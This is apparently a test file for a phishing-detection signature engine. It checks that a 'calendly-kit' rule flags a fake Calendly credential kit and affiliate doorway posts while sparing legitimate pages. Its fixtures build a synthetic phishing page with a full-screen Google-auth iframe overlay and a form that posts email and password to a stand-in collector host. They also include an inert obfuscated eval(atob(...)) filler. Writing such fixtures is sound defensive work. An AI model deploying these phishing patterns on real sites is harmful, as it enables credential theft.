// Signature engine — the calendly-kit.yml signature MUST match the incident
// corpus (the sydneyavspecialists Calendly credential kit + its affiliate
// doorway posts) and MUST spare benign pages, including a legit Calendly embed.

import { describe, expect, test } from "bun:test";

import { loadSignatures, matchSignatures, parseSignature } from "../src/signatures";
import type { SignatureMatchInput } from "../src/index";

// ── incident corpus fixtures (mirrors packages/rules/tests/integrity.test.ts) ──

// Large high-entropy obfuscated inline payload carrying the anti-tamper string.
function obfuscatedPayload(): string {
  let s = 'var _0x1a2b=function(){return "the code has been tampered!";};eval(atob("';
  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  let seed = 1337;
  for (let i = 0; i < 8200; i++) {
    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
    s += alphabet[(seed >> 16) % alphabet.length];
  }
  s += '"));String.fromCharCode(104,105);';
  return s;
}

// POSITIVE — the kit page: Calendly title + #google-auth full-viewport overlay +
// obfuscated anti-tamper payload + off-origin credential form.
function kitPage(): SignatureMatchInput {
  const title = "Discovery Call · Calendly (Updated)";
  const html = `<!DOCTYPE html><html><head><title>${title}</title>
    <script>${obfuscatedPayload()}</script></head>
    <body>
    <iframe id="google-auth" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999" src="https://verify-account.tk/login"></iframe>
    <div>Sign in with Google to confirm your Calendly discovery call.</div>
    <form action="https://evil-collector.tk/grab" method="post">
      <input type="email"><input type="password"><button>Sign in</button>
    </form></body></html>`;
  return { url: "https://sydneyavspecialists.com.au/calendly?token=ey4m", title, html };
}

// POSITIVE — injected affiliate doorway post (campaign sibling).
function doorwayPage(): SignatureMatchInput {
  const title = "Calendly ClickFunnels 2.0 (5 HELPFUL TIPS) - Best Sales Funnel";
  return {
    url: "https://sydneyavspecialists.com.au/blog/calendly-clickfunnels-tips",
    title,
    html: `<article><h1>${title}</h1><p>clickfunnels kajabi affiliate sales funnel</p></article>`,
  };
}

// NEGATIVE — legit SaaS page that merely MENTIONS / embeds the real Calendly.
function legitCalendlyPage(): SignatureMatchInput {
  const title = "Calendly Integration - Sydney AV Booking";
  return {
    url: "https://sydneyavspecialists.com.au/integrations",
    title,
    html: `<article><h1>Book a call via our Calendly integration</h1>
      <a href="https://calendly.com/sydneyav/discovery">Schedule on Calendly</a></article>`,
  };
}

// NEGATIVE — clean themed page, no Calendly at all.
function cleanPage(): SignatureMatchInput {
  return {
    url: "https://sydneyavspecialists.com.au/",
    title: "Home - Sydney AV",
    html: "<main><p>Professional audiovisual hire across Sydney.</p></main>",
  };
}

describe("calendly-kit signature — incident corpus", () => {
  const signatures = loadSignatures();

  test("the bundled signature loads and validates", () => {
    expect(signatures.length).toBeGreaterThanOrEqual(1);
    const calendly = signatures.find((s) => s.id === "calendly-kit");
    expect(calendly).toBeDefined();
    expect(calendly?.severity).toBe("critical");
  });

  test("MATCHES the kit page (brand + overlay + anti-tamper)", () => {
    const hits = matchSignatures(signatures, kitPage());
    const hit = hits.find((h) => h.id === "calendly-kit");
    expect(hit).toBeDefined();
    expect(hit?.severity).toBe("critical");
    expect(hit?.matchedStrings).toContain("calendly_brand");
    expect(hit?.matchedStrings).toContain("google_auth_overlay");
    expect(hit?.matchedStrings).toContain("anti_tamper");
  });

  test("MATCHES the affiliate doorway post (campaign sibling)", () => {
    const hits = matchSignatures(signatures, doorwayPage());
    expect(hits.some((h) => h.id === "calendly-kit")).toBe(true);
  });

  test("SPARES a legit Calendly embed (brand alone never fires)", () => {
    const hits = matchSignatures(signatures, legitCalendlyPage());
    expect(hits.some((h) => h.id === "calendly-kit")).toBe(false);
  });

  test("SPARES a clean page", () => {
    const hits = matchSignatures(signatures, cleanPage());
    expect(hits).toHaveLength(0);
  });

  test("overlay or anti-tamper alone (without brand) does NOT fire", () => {
    const noBrand: SignatureMatchInput = {
      url: "https://x.test/",
      title: "Login",
      html: '<iframe id="google-auth"></iframe><script>the code has been tampered</script>',
    };
    expect(matchSignatures(signatures, noBrand).some((h) => h.id === "calendly-kit")).toBe(false);
  });

  test("SPARES a legit ClickFunnels blog title that never mentions Calendly", () => {
    const legitFunnelPost: SignatureMatchInput = {
      url: "https://marketing.example/blog/clickfunnels-tips",
      title: "ClickFunnels 2.0: 5 Best Tips for Your Sales Funnel",
      html: "<article><p>A genuine marketing tutorial about funnels.</p></article>",
    };
    expect(matchSignatures(signatures, legitFunnelPost).some((h) => h.id === "calendly-kit")).toBe(
      false,
    );
  });
});

// ── condition grammar + parseSignature validation ──

describe("signature condition grammar", () => {
  const make = (condition: string) =>
    parseSignature({
      id: "t",
      name: "t",
      strings: {
        a: { contains: "aaa", target: "html" },
        b: { contains: "bbb", target: "html" },
        c: { contains: "ccc", target: "html" },
      },
      condition,
    });

  const run = (condition: string, html: string) =>
    matchSignatures([make(condition)], { url: "u", html }).length > 0;

  test("and / or / not", () => {
    expect(run("a and b", "aaa bbb")).toBe(true);
    expect(run("a and b", "aaa")).toBe(false);
    expect(run("a or b", "bbb")).toBe(true);
    expect(run("a and not b", "aaa")).toBe(true);
    expect(run("a and not b", "aaa bbb")).toBe(false);
  });

  test("parentheses", () => {
    expect(run("a and (b or c)", "aaa ccc")).toBe(true);
    expect(run("a and (b or c)", "aaa")).toBe(false);
  });

  test("quantifiers: all / any / N of", () => {
    expect(run("all of them", "aaa bbb ccc")).toBe(true);
    expect(run("all of them", "aaa bbb")).toBe(false);
    expect(run("any of them", "ccc")).toBe(true);
    expect(run("2 of them", "aaa bbb")).toBe(true);
    expect(run("2 of them", "aaa")).toBe(false);
    expect(run("2 of (a, b, c)", "aaa ccc")).toBe(true);
  });

  test("default condition is 'all of them'", () => {
    const sig = parseSignature({
      id: "d",
      name: "d",
      strings: { a: { contains: "aaa" }, b: { contains: "bbb" } },
    });
    expect(matchSignatures([sig], { url: "u", html: "aaa bbb" })).toHaveLength(1);
    expect(matchSignatures([sig], { url: "u", html: "aaa" })).toHaveLength(0);
  });

  test("rejects an unknown string reference in the condition", () => {
    expect(() => make("a and zzz")).toThrow(/unknown string/);
  });

  test("rejects a malformed signature", () => {
    expect(() => parseSignature({ id: "x" })).toThrow();
    expect(() =>
      parseSignature({ id: "x", name: "x", strings: { a: { target: "html" } } }),
    ).toThrow(/contains.*regex/);
  });
});

describe("signature targets + regex flags", () => {
  test("regex with nocase, scoped to title", () => {
    const sig = parseSignature({
      id: "r",
      name: "r",
      strings: { t: { regex: "PHISH", target: "title", nocase: true } },
      condition: "t",
    });
    expect(matchSignatures([sig], { url: "u", title: "go phish now", html: "" })).toHaveLength(1);
    // Same text in html (not title) must NOT match — target is scoped.
    expect(matchSignatures([sig], { url: "u", title: "", html: "phish" })).toHaveLength(0);
  });

  test("scripts target matches external script bodies only", () => {
    const sig = parseSignature({
      id: "s",
      name: "s",
      strings: { m: { contains: "malware()", target: "scripts" } },
      condition: "m",
    });
    expect(
      matchSignatures([sig], { url: "u", html: "<p>x</p>", scripts: ["x; malware();"] }),
    ).toHaveLength(1);
    expect(matchSignatures([sig], { url: "u", html: "malware()" })).toHaveLength(0);
  });
});
